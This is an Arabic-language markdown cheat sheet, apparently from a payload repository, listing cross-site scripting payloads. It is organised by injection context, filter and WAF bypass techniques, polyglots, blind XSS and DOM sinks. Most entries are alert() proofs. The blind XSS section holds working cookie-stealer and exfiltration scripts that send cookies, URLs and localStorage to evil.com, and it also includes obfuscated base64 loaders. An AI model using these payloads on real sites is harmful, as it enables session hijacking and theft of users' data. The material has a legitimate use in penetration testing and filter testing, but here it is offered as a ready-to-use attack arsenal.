<a id="-xss-payloads-collection"></a>
# 💉 مجموعة حمولات البرمجة النصية عبر المواقع (XSS)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](XSS.tr.md) • [🇬🇷 Ελληνικά](XSS.el.md)

```
  ██╗  ██╗███████╗███████╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
   ╚███╔╝ ███████╗███████╗    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
   ██╔██╗ ╚════██║╚════██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ██╔╝ ██╗███████║███████║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

> الرسم النصي أعلاه يعرض عنوان المجموعة بالإنجليزية؛ تُشرح الموضوعات والمصطلحات بالعربية في الأقسام التالية.

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [حمولات أساسية](#-basic-payloads)
- [حمولات معالجات الأحداث](#-event-handler-payloads)
- [الحقن في سمات HTML](#-attribute-injection)
- [سياق JavaScript](#-javascript-context)
- [تجاوز المرشحات](#-filter-bypass)
- [تجاوز جدار حماية تطبيقات الويب (WAF)](#-waf-bypass)
- [حمولات متعددة السياقات (Polyglot)](#-polyglot-payloads)
- [هجمات XSS العمياء](#-blind-xss)
- [هجمات XSS عبر نموذج المستند (DOM)](#-dom-xss)

---

<a id="-basic-payloads"></a>
## 🔴 حمولات أساسية

<a id="classic-script-tags"></a>
### وسوم script التقليدية

```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>console.log('XSS')</script>
```

<a id="self-closing-tags"></a>
### الوسوم ذاتية الإغلاق

```html
<script src="https://evil.com/xss.js"/>
<script src=//evil.com/xss.js></script>
<script/src="https://evil.com/xss.js"></script>
```

<a id="external-script"></a>
### سكربت خارجي

```html
<script src="https://evil.com/xss.js"></script>
<script src="data:text/javascript,alert(1)"></script>
<script src="data:,alert(1)"></script>
```

---

<a id="-event-handler-payloads"></a>
## ⚡ حمولات معالجات الأحداث

<a id="image-events"></a>
### أحداث الصور

```html
<img src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')">
<img/src=x onerror=alert('XSS')>
<img src="x" onerror="alert(1)">
<img src=1 onerror=alert(1)>
<img src=/ onerror=alert(1)>
<img src="javascript:alert(1)">
<img onload=alert('XSS') src="valid.jpg">
```

<a id="svg-events"></a>
### أحداث SVG

```html
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>
<svg onload="alert('XSS')">
<svg><script>alert(1)</script></svg>
<svg><script>alert&#40;1&#41;</script></svg>
```

<a id="body-events"></a>
### أحداث body

```html
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<body onfocus=alert('XSS')>
<body onhashchange=alert('XSS')>
<body onscroll=alert('XSS')>
```

<a id="input-events"></a>
### أحداث حقول الإدخال

```html
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>
<input type="image" src=x onerror=alert('XSS')>
<input type="text" onfocus="alert('XSS')" autofocus>
```

<a id="other-event-handlers"></a>
### معالجات أحداث أخرى

```html
<marquee onstart=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<iframe onload=alert('XSS')>
<object data=javascript:alert('XSS')>
<embed src=javascript:alert('XSS')>
<a onmouseover=alert('XSS')>click me</a>
<div onmouseover=alert('XSS')>hover me</div>
<form onsubmit=alert('XSS')><input type=submit>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
```

---

<a id="-attribute-injection"></a>
## 🔗 الحقن في سمات HTML

<a id="breaking-out-of-attributes"></a>
### الخروج من سياق السمات

```html
"><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>
'><script>alert('XSS')</script>
'><img src=x onerror=alert('XSS')>
"><svg onload=alert('XSS')>
" onmouseover="alert('XSS')
' onmouseover='alert(1)'
" onfocus="alert('XSS')" autofocus "
```

<a id="event-in-attributes"></a>
### أحداث داخل السمات

```html
" onclick=alert('XSS') "
" onmouseover=alert('XSS') "
" onfocus=alert('XSS') autofocus "
" onload=alert('XSS') "
```

<a id="style-attribute-old-browsers"></a>
### سمة style (متصفحات قديمة)

```html
<div style="background:url(javascript:alert('XSS'))">
<div style="width:expression(alert('XSS'))">
```

---

<a id="-javascript-context"></a>
## 📜 سياق JavaScript

<a id="breaking-out-of-javascript"></a>
### الخروج من سياق JavaScript

```javascript
';alert('XSS');//
";alert('XSS');//
</script><script>alert('XSS')</script>
'-alert('XSS')-'
"-alert('XSS')-"
\';alert(1)//
\";alert(1)//
```

<a id="template-literals"></a>
### قوالب السلاسل النصية (Template Literals)

```javascript
${alert('XSS')}
`${alert(1)}`
${alert`XSS`}
```

<a id="inside-json"></a>
### داخل JSON

```json
{"name":"test","value":"</script><script>alert(1)</script>"}
```

---

<a id="-filter-bypass"></a>
## 🔓 تجاوز المرشحات

<a id="case-variation"></a>
### تغيير حالة الأحرف

```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<scRIPT>alert('XSS')</scRIPT>
<IMG SRC=x OnErRoR=alert('XSS')>
```

<a id="tag-breaking"></a>
### تجزئة الوسوم

```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<sc\x00ript>alert('XSS')</sc\x00ript>
<scr\x09ipt>alert('XSS')</scr\x09ipt>
```

<a id="encoding---html-entities"></a>
### الترميز باستخدام كيانات HTML

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>
```

<a id="url-encoding"></a>
### ترميز URL

```html
<img src=x onerror=%61%6c%65%72%74%28%31%29>
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
```

<a id="unicode-encoding"></a>
### ترميز Unicode

```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
```

<a id="null-byte-injection"></a>
### حقن بايت صفري

```html
<scr\x00ipt>alert('XSS')</scr\x00ipt>
<img src=x onerror=alert('XSS')\x00>
```

<a id="whitespace-bypass"></a>
### تجاوز ترشيح المحارف البيضاء

```html
<img/src=x/onerror=alert('XSS')>
<img\nsrc=x\nonerror=alert('XSS')>
<img\tsrc=x\tonerror=alert('XSS')>
<img src=x	onerror=alert('XSS')>
```

<a id="without-parentheses"></a>
### دون أقواس

```html
<script>alert`XSS`</script>
<script>onerror=alert;throw'XSS'</script>
<img src=x onerror=alert`1`>
<img src=x onerror="window['alert'](1)">
```

<a id="without-quotes"></a>
### دون علامات اقتباس

```html
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(/XSS/)>
```

---

<a id="-waf-bypass"></a>
## 🛡️ تجاوز جدار حماية تطبيقات الويب (WAF)

<a id="double-encoding"></a>
### الترميز المزدوج

```html
%253Cscript%253Ealert(1)%253C/script%253E
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
```

<a id="using-comments"></a>
### استخدام التعليقات

```html
<script>/**/alert('XSS')/**/</script>
<img src=x onerror=/**/alert(1)/**//>
<!--<script>-->alert(1)<!--</script>-->
```

<a id="line-breaks"></a>
### فواصل الأسطر

```html
<script>
alert('XSS')
</script>

<img src=x
onerror
=
alert(1)>
```

<a id="alternative-tags"></a>
### وسوم بديلة

```html
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<math><maction xlink:href="javascript:alert(1)">click
<isindex action="javascript:alert(1)" type=submit value=click>
```

<a id="svg-based-bypass"></a>
### التجاوز باستخدام SVG

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x dur=1s>
<svg/onload=alert(1)>
```

<a id="using-eval"></a>
### استخدام `eval`

```html
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

<a id="using-settimeoutsetinterval"></a>
### استخدام `setTimeout`/`setInterval`

```html
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',0)</script>
<img src=x onerror=setTimeout('alert(1)')>
```

<a id="using-fetch"></a>
### استخدام `fetch`

```html
<script>fetch('https://evil.com/'+document.cookie)</script>
```

---

<a id="-polyglot-payloads"></a>
## 🎭 حمولات متعددة السياقات (Polyglot)

<a id="universal-xss-polyglots"></a>
### حمولات XSS متعددة السياقات عامة الاستخدام

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23telecomhallx27telecomhall;)>'">

"><img src=x onerror=alert(1)//>'\"><img src=x onerror=alert(1)//><img src=x onerror=alert(1)//>'\"

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

<a id="short-polyglot"></a>
### حمولة قصيرة متعددة السياقات

```html
'"><script>alert(1)</script>
'"><img src=x onerror=alert(1)>
```

---

<a id="-blind-xss"></a>
## 👁️ هجمات XSS العمياء

<a id="cookie-stealer"></a>
### سرقة ملفات تعريف الارتباط

```html
<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>
<script>fetch('https://evil.com/'+document.cookie)</script>
<img src=x onerror="this.src='https://evil.com/?c='+document.cookie">
```

<a id="data-exfiltration"></a>
### تسريب البيانات

```html
<script>
var i=new Image();
i.src="https://evil.com/?cookie="+document.cookie+"&url="+document.URL;
</script>

<script>
fetch('https://evil.com/collect',{
    method:'POST',
    body:JSON.stringify({
        cookie:document.cookie,
        url:location.href,
        localStorage:JSON.stringify(localStorage)
    })
})
</script>
```

<a id="xss-hunter-payloads"></a>
### حمولات XSS Hunter

```html
"><script src=https://xss.ht></script>
"><img src=x onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8veHNzLmh0Lz9jPScrZG9jdW1lbnQuY29va2ll'))">
```

<a id="blind-xss-for-forms"></a>
### حمولات XSS العمياء للنماذج

```html
"><script src="https://your.xss.ht"></script>
test@test.com"><script src="https://your.xss.ht"></script>
{{constructor.constructor('fetch("https://your.xss.ht?c="+document.cookie)')()}}
```

---

<a id="-dom-xss"></a>
## 🌐 هجمات XSS عبر نموذج المستند (DOM)

<a id="source-based-dom-xss"></a>
### هجمات DOM XSS حسب مصدر البيانات

```javascript
// جزء URL بعد العلامة #
https://example.com#<script>alert(1)</script>

// معامل URL
https://example.com?name=<script>alert(1)</script>

// document.referrer
Referer: <script>alert(1)</script>
```

<a id="common-sinks"></a>
### مواضع التنفيذ الخطرة الشائعة (Sinks)

```javascript
// innerHTML
document.getElementById('x').innerHTML = userInput;
// Payload: <img src=x onerror=alert(1)>

// document.write
document.write(userInput);
// Payload: <script>alert(1)</script>

// eval
eval(userInput);
// Payload: alert(1)

// location
location = userInput;
location.href = userInput;
// Payload: javascript:alert(1)
```

<a id="jquery-sinks"></a>
### مواضع التنفيذ الخطرة في jQuery

```javascript
// $().html()
$('#x').html(userInput);
// Payload: <img src=x onerror=alert(1)>

// $()
$(userInput);
// Payload: <img src=x onerror=alert(1)>

// $.parseHTML()
$.parseHTML(userInput);
// Payload: <img src=x onerror=alert(1)>
```

<a id="angular-payloads"></a>
### حمولات Angular

```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

---

<a id="-quick-reference-by-context"></a>
## 📊 مرجع سريع حسب السياق

<a id="html-context"></a>
### سياق HTML
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

<a id="attribute-context"></a>
### سياق السمات
```html
" onmouseover="alert(1)
"><script>alert(1)</script>
' onfocus='alert(1)' autofocus='
```

<a id="javascript-string-context"></a>
### سياق سلسلة نصية في JavaScript
```javascript
';alert(1)//
"-alert(1)-"
</script><script>alert(1)</script>
```

<a id="url-context"></a>
### سياق URL
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

<a id="-resources"></a>
## 📚 مصادر

- [مرجع XSS من PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [تجاوز مرشحات XSS من OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

<p align="center">
  <b>💉 ترسانة حمولات XSS</b><br>
  <i>للأغراض التعليمية فقط!</i>
</p>
